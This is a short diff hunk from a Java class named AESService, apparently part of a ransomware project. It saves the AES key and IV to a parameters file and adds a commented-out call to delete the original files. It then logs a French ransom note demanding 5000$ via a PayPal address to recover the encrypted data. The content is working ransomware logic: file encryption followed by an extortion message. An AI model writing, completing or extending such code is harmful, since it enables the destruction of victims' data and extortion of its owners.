@@ -68,7 +68,8 @@ public class AESService {
         JsonUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv);
         Logger.logDebug(String.format("Save key and iv to %s", ENCRYPTION_PARAMS_FILENAME));
 
-        // TODO : Delete files?
+        // TODO : Delete files
+        // FileUtils.deleteFiles(files);
 
         // Display ransom message
         Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
